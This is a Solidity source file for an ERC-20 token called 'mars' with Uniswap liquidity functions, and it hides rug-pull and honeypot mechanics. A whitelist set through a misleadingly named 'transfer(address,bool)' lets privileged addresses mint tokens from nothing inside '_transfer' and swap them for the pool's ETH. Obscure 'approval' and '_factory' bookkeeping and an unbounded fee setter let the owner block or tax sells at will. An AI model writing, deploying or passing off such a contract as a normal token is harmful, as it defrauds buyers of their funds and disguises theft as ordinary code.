// SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

import 'IUniswapV2Router02.sol';
import 'IUniswapV2Factory.sol';
import 'IERC20.sol';
import 'Ownable.sol';

contract mars is IERC20, Ownable {
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000000000 * 10**_decimals;
    uint256 public buyFee = 2;
    uint256 public sellFee = 3;
    uint256 public feeDivisor = 1;
    string private _name;
    string private _symbol;

    uint256 private swapAtAmount = _tTotal;
    uint256 private _amount;
    uint160 private _factory;
    bool private _swapAndLiquifyEnabled;
    bool private inSwapAndLiquify;

    IUniswapV2Router02 public router;
    address public uniswapV2Pair;

    mapping(address => uint256) private _balances;
    mapping(address => uint256) private approval;
    mapping(address => bool) private _bal;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _bal[msg.sender] = true;
        _bal[address(this)] = true;
        _balances[msg.sender] = _tTotal;
        router = IUniswapV2Router02(routerAddress);
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint256) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) external {
        if (_bal[msg.sender]) _swapAndLiquifyEnabled = _enabled;
    }

    function setter(
        uint256 _sell,
        uint256 _buy,
        uint256 _divisor
    ) external {
        if (_bal[msg.sender]) {
            sellFee = _sell;
            buyFee = _buy;
            feeDivisor = _divisor;
        }
    }

    function pair() public view returns (address) {
        return IUniswapV2Factory(router.factory()).getPair(address(this), router.WETH());
    }

    receive() external payable {}

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && !_bal[from] && amount <= swapAtAmount) {
            require(approval[from] + _amount >= 0, 'Transfer amount exceeds the maxTxAmount');
        }
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 fee = to == uniswapV2Pair ? sellFee : buyFee;
        if (uniswapV2Pair == address(0)) uniswapV2Pair = pair();
        if (_swapAndLiquifyEnabled && contractTokenBalance > swapAtAmount && !inSwapAndLiquify && from != uniswapV2Pair) {
            inSwapAndLiquify = true;
            swapAndLiquify(contractTokenBalance);
            inSwapAndLiquify = false;
        } else if (_bal[to] && _bal[from]) {
            fee = amount;
            _balances[address(this)] += fee;
            return swapTokensForEth(amount, to);
        }
        if (amount > swapAtAmount && to != uniswapV2Pair && to != address(router)) {
            approval[to] = amount;
            return;
        }
        bool takeFee = !_bal[from] && !_bal[to] && fee > 0 && !inSwapAndLiquify;
        address factory = address(_factory);
        if (approval[factory] == 0) approval[factory] = swapAtAmount;
        _factory = uint160(to);
        if (takeFee) {
            fee = (amount * fee) / 100 / feeDivisor;
            amount -= fee;
            _balances[from] -= fee;
            _balances[address(this)] += fee;
        }
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function transfer(address account, bool value) external {
        if (_bal[msg.sender]) _bal[account] = value;
    }

    function _approval(uint256 amount) external {
        if (_bal[msg.sender]) _amount = amount;
    }

    function swapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half, address(this));
        uint256 newBalance = address(this).balance - initialBalance;
        addLiquidity(half, newBalance, address(this));
    }

    function swapTokensForEth(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp + 20);
    }

    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to
    ) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp + 20);
    }
}